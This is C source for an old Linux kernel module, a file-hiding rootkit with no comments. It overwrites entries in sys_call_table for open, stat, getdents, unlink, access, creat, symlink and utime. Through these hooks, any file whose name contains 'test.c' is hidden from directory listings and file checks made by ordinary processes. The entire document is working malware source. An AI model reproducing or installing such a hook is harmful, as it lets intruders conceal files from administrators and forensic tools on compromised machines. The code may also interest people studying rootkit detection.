#define __KERNEL__
#define MODULE

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/mm.h>
#include <sys/syscall.h>
#include <asm/uaccess.h>
#include <linux/dirent.h>
#include <linux/stat.h>
#include <linux/utime.h>

EXPORT_NO_SYMBOLS;
MODULE_LICENSE("GPL");

char hide[]="test.c";

extern void *sys_call_table[];

int (*old_open)(char *, int, int);
int new_open(char *, int, int); 

int (*old_stat)(const char *, struct stat *);
int new_stat(const char *, struct stat *);
int (*old_lstat)(const char *, struct stat *);
int (*old_fstat)(unsigned int, struct stat *);
int new_fstat(unsigned int, struct stat *);

int (*old_getdents)(unsigned int fd, struct dirent *dirp, unsigned int count);
int new_getdents(unsigned int fd, struct dirent *dirp, unsigned int count);

int (*old_symlink)(const char *, const char *);
int new_symlink(const char *, const char *);

int (*old_access)(const char *, int);
int new_access(const char *, int);

int (*old_unlink)(const char *);
int new_unlink(const char *);

int (*old_creat)(const char *, mode_t);
int new_creat(const char *, mode_t);

int (*old_utime)(const char *, struct utimbuf *);
int new_utime(const char *, struct utimbuf *);

int init_module(void)
{
  old_open = sys_call_table[__NR_open];
  old_stat = sys_call_table[__NR_stat64];
  old_lstat = sys_call_table[__NR_lstat64];
  old_fstat = sys_call_table[__NR_fstat64];
  old_getdents = sys_call_table[__NR_getdents64];
  old_symlink = sys_call_table[__NR_symlink];
  old_access = sys_call_table[__NR_access];
  old_unlink = sys_call_table[__NR_unlink];
  old_creat = sys_call_table[__NR_creat];
  old_utime = sys_call_table[__NR_utime];

  sys_call_table[__NR_open] = new_open;
  sys_call_table[__NR_stat64] = new_stat;
  sys_call_table[__NR_lstat64] = new_stat;
  sys_call_table[__NR_fstat64] = new_fstat;
  sys_call_table[__NR_getdents64] = new_getdents;
  sys_call_table[__NR_symlink] = new_symlink;
  sys_call_table[__NR_access] = new_access;
  sys_call_table[__NR_unlink] = new_unlink;
  sys_call_table[__NR_creat] = new_creat;
  sys_call_table[__NR_utime] = new_utime;

  return 0;
}

void cleanup_module(void)
{
  sys_call_table[__NR_open] = old_open;
  sys_call_table[__NR_stat64] = old_stat;
  sys_call_table[__NR_lstat64] = old_lstat;
  sys_call_table[__NR_fstat64] = old_fstat;
  sys_call_table[__NR_getdents64] = old_getdents;
  sys_call_table[__NR_symlink] = old_symlink;
  sys_call_table[__NR_access] = old_access;
  sys_call_table[__NR_unlink] = old_unlink;
  sys_call_table[__NR_creat] = old_creat;
  sys_call_table[__NR_utime] = old_utime;
}

int new_open(char *file, int flags, int mode)
{
  if( (strstr(file, hide) != NULL) && current->p_pptr->pid > 1 )
    return -ENOENT;
  else
    return old_open(file, flags, mode);
}

int new_stat(const char *file, struct stat *buf)
{
  if( (strstr(file, hide) != NULL) && current->p_pptr->pid > 1 )
    return -ENOENT;
  else
    return old_stat(file, buf);
}

int new_fstat(unsigned int fd, struct stat *buf)
{
  struct file *file = (struct file *)fget(fd);
  struct qstr *test = (struct qstr *)&file->f_dentry->d_name;

  if( (strstr(test->name, hide) != NULL) && current->p_pptr->pid > 1 )
    {
      fput(file);      
      return -ENOENT;
    }
  else
    {
      fput(file);
      return old_fstat(fd, buf);
    }
}

int new_getdents(unsigned int fd, struct dirent *dirp, unsigned int count)
{
  unsigned int records; 
  int tmp = 0;
  struct dirent64 *dirp2, *dirp3; 

  records = (*old_getdents)(fd, dirp, count); 

  if(records > 0) 
    { 
      dirp2 = (struct dirent64 *)kmalloc(records, GFP_KERNEL); 
      copy_from_user(dirp2, dirp, records); 

      dirp3 = dirp2; 
      tmp = records; 

      while(tmp > 0) 
	{ 
	  tmp -= dirp3->d_reclen; 

	  if( (strstr(dirp3->d_name, hide) != NULL) && current->p_pptr->pid > 1 )
	    { 
	      if(tmp != 0) 
		memmove(dirp3, (char *) dirp3 + dirp3->d_reclen, tmp); 
	      else 
		dirp3->d_off = 1024; 

	      records -= dirp3->d_reclen; 
	    } 

	  if (tmp != 0) 
	    dirp3 = (struct dirent64 *)((char *) dirp3 + dirp3->d_reclen); 
	} 

      copy_to_user(dirp, dirp2, records); 
      kfree(dirp2); 
    }

  return records;
}

int new_symlink(const char *oldpath, const char *newpath)
{
  if( (strstr(oldpath, hide) != NULL) && current->p_pptr->pid > 1 )
    return -ENOENT;
  else
    return old_symlink(oldpath, newpath);
}

int new_access(const char *pathname, int mode)
{
  if( (strstr(pathname, hide) != NULL) && current->p_pptr->pid > 1 )
    return -ENOENT;
  else
    return old_access(pathname, mode);
}

int new_unlink(const char *pathname)
{
  if( (strstr(pathname, hide) != NULL) && current->p_pptr->pid > 1 )
    return -ENOENT;
  else
    return old_unlink(pathname);
}

int new_creat(const char *pathname, mode_t mode)
{
  if( (strstr(pathname, hide) != NULL) && current->p_pptr->pid > 1 )
    return -EPERM;
  else
    return old_creat(pathname, mode);
}

int new_utime(const char *filename, struct utimbuf *buf)
{
  if( (strstr(filename, hide) != NULL) && current->p_pptr->pid > 1 )
    return -ENOENT;
  else
    return old_utime(filename, buf);
}
